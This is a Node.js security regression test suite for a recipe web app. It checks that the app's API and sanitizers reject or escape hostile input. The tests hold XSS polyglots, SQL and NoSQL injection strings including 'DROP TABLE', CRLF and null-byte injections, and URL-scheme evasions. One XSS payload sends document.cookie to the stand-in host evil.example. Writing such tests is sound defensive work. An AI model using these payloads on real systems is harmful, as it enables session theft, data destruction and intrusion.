/**
 * Advanced Defensive Penetration & Security Regression Test Suite
 * Validates resilience against OWASP Top 10 vulnerabilities, payload bombs, and injection vectors
 */
import test from 'node:test';
import assert from 'node:assert';
import http from 'node:http';
import app from '../server/index.js';
import { safeGet, safeSet, normalizeFavoriteRecord } from '../src/services/storageService.js';
import { sanitizeHtml, sanitizeTextInput, sanitizeUrl } from '../src/utils/securitySanitizer.js';

let server;
let baseUrl;

const storageMock = new Map();
globalThis.localStorage = {
  getItem: (key) => storageMock.get(key) || null,
  setItem: (key, val) => storageMock.set(key, String(val)),
  removeItem: (key) => storageMock.delete(key),
  clear: () => storageMock.clear()
};

test.before(async () => {
  await new Promise((resolve) => {
    server = http.createServer(app);
    server.listen(0, () => {
      const port = server.address().port;
      baseUrl = `http://localhost:${port}/api`;
      resolve();
    });
  });
});

test.after(async () => {
  await new Promise((resolve) => server.close(resolve));
});

test('SEC-01: Disallows dangerous / unsupported HTTP methods (DELETE -> 405)', async () => {
  const res = await fetch(`${baseUrl}/health`, { method: 'DELETE' });
  assert.strictEqual(res.status, 405, 'Expected 405 Method Not Allowed for DELETE');
  const body = await res.json();
  assert.strictEqual(body.error, 'Method Not Allowed');
});

test('SEC-02: Blocks Null Byte injection in request URL path (%00 -> 400)', async () => {
  const res = await fetch(`${baseUrl}/recipes%00/search?q=chicken`);
  assert.strictEqual(res.status, 400, 'Expected 400 Bad Request on null byte in path');
  const body = await res.json();
  assert(body.message.toLowerCase().includes('null byte'));
});

test('SEC-03: Blocks CRLF header injection vectors in query parameters (%0D%0A -> 400)', async () => {
  const evilParam = encodeURIComponent('chicken\r\nSet-Cookie: admin=true');
  const res = await fetch(`${baseUrl}/recipes/search?q=${evilParam}`);
  assert.strictEqual(res.status, 400, 'Expected 400 Bad Request on CRLF in query param');
});

test('SEC-04: Rejects Deeply Nested JSON Payload Bombs (Depth > 6 -> 400)', async () => {
  let nested = { value: 'leaf' };
  for (let i = 0; i < 9; i++) {
    nested = { nest: nested };
  }

  const res = await fetch(`${baseUrl}/recipes/pantry`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(nested)
  });
  assert.strictEqual(res.status, 400, 'Expected 400 Bad Request on deeply nested JSON payload');
});

test('SEC-05: Rejects Massive Array Bomb (> 100 elements -> 400)', async () => {
  const massiveArray = new Array(250).fill('garlic');
  const res = await fetch(`${baseUrl}/recipes/pantry`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ingredients: massiveArray })
  });
  assert.strictEqual(res.status, 400, 'Expected 400 Bad Request on array exceeding element limits');
});

test('SEC-06: Rejects Oversized String Elements inside JSON Arrays (> 200 chars -> 400)', async () => {
  const longString = 'a'.repeat(300);
  const res = await fetch(`${baseUrl}/recipes/pantry`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ingredients: [longString] })
  });
  assert.strictEqual(res.status, 400, 'Expected 400 Bad Request on array element exceeding length limit');
});

test('SEC-07: Neutralizes Reflected XSS Polyglot Payloads in search parameters', async () => {
  const xssPayload = '"><script>alert(1)</script><img src=x onerror=prompt(1)>';
  const res = await fetch(`${baseUrl}/recipes/search?q=${encodeURIComponent(xssPayload)}`);
  assert.strictEqual(res.status, 200);
  const data = await res.json();
  assert(Array.isArray(data.recipes));
  // Content type must be strict application/json and not executable HTML
  assert.strictEqual(res.headers.get('content-type').split(';')[0], 'application/json');
});

test('SEC-08: Safely treats SQL / NoSQL injection payloads as literal strings without error', async () => {
  const payloads = [
    "' OR '1'='1",
    "'; DROP TABLE recipes; --",
    '{"$gt": ""}',
    '{"$where": "sleep(500)"}'
  ];

  for (const p of payloads) {
    const res = await fetch(`${baseUrl}/recipes/search?q=${encodeURIComponent(p)}`);
    assert.strictEqual(res.status, 200, `Failed safely executing injection string: ${p}`);
    const data = await res.json();
    assert(Array.isArray(data.recipes));
  }
});

test('SEC-09: Unmatched API routes return clean, unrevealing 404 responses', async () => {
  const res = await fetch(`${baseUrl}/non_existent_secret_admin_route`);
  assert.strictEqual(res.status, 404);
  const data = await res.json();
  assert.strictEqual(data.error, 'Endpoint Not Found');
  // Must not expose absolute filesystem paths
  assert(!JSON.stringify(data).includes('C:\\'));
  assert(!JSON.stringify(data).includes('/home/'));
});

test('SEC-10: Client-side XSS Sanitizer escapes dangerous HTML entities into safe text', () => {
  const hostileInput = '<a href="javascript:alert(1)" onclick="stealCookies()">Click me <script>evil()</script></a>';
  const cleanHtml = sanitizeHtml(hostileInput);
  assert(cleanHtml.includes('&lt;script&gt;'), 'Script tag must be entity escaped');
  assert(cleanHtml.includes('&quot;'), 'Quotes must be entity escaped');
  assert(!cleanHtml.includes('<script>'), 'Unescaped tag must not exist');
});

test('SEC-11: Client storage normalization replaces hostile prototype properties safely', () => {
  const hostileRecipe = {
    id: 12345,
    title: '<b>Hostile Dish</b><script>alert(1)</script>',
    thumbnail: 'javascript:alert(1)',
    instructions: 'Normal text with null\x00byte'
  };

  const normalized = normalizeFavoriteRecord(hostileRecipe);
  assert.strictEqual(typeof normalized.id, 'string');
  assert.strictEqual(normalized.thumbnail, '', 'Dangerous javascript: URL must be blanked');
  assert(!normalized.instructions.includes('\x00'), 'Null byte must be stripped');
});

test('SEC-12: Pantry chip renderer escapes stored user input before HTML insertion', async () => {
  const { buildPantryChipsHtml } = await import('../src/components/PantryFinder.js');
  const hostileItems = [
    '<img src=x onerror="alert(\'pantry-XSS\')">',
    '"><script>document.location="https://evil.example/"+document.cookie</script>'
  ];
  const html = buildPantryChipsHtml(hostileItems);
  assert(!html.includes('<img src=x'), 'Raw img injection must not survive');
  assert(!html.includes('<script>'), 'Raw script tag must not survive');
  assert(html.includes('&lt;script&gt;'), 'Script tag must be entity escaped in chip markup');
  // data-remove attribute must be URL-encoded so removal still works
  assert(html.includes('data-remove='), 'Removal hook must remain present');
});

test('SEC-13: sanitizeUrl blocks data:, vbscript: and protocol-relative evasion URLs', () => {
  const evasions = [
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:msgbox("x")',
    'JaVaScRiPt:alert(1)',
    ' javascript:alert(1)'
  ];
  for (const url of evasions) {
    assert.strictEqual(sanitizeUrl(url, '#'), '#', `Must block: ${url}`);
  }
  assert.strictEqual(sanitizeUrl('https://www.themealdb.com/images/x.jpg', '#'), 'https://www.themealdb.com/images/x.jpg');
});

test('SEC-14: formatRecipe neutralizes hostile API payload fields end-to-end', async () => {
  const { formatRecipe } = await import('../src/services/mealDbApi.js');
  const hostileMeal = {
    idMeal: '52772"><script>alert(1)</script>',
    strMeal: 'Evil <img src=x onerror=alert(1)> Dish',
    strCategory: 'Dessert<script>',
    strArea: 'International<img src=x>',
    strInstructions: 'Step 1 <script>alert(1)</script>',
    strMealThumb: 'javascript:alert(1)',
    strIngredient1: '<svg onload=alert(1)>',
    strMeasure1: '"><script>alert(1)</script>'
  };
  const safe = formatRecipe(hostileMeal);
  assert(!safe.title.includes('<img'), 'Title tags must be escaped');
  assert(!safe.category.includes('<script>'), 'Category script must be escaped');
  assert.strictEqual(safe.thumbnail, '', 'Hostile thumbnail URL must be blanked');
  assert(!safe.ingredients[0].name.includes('<svg'), 'Ingredient name must be escaped');
});
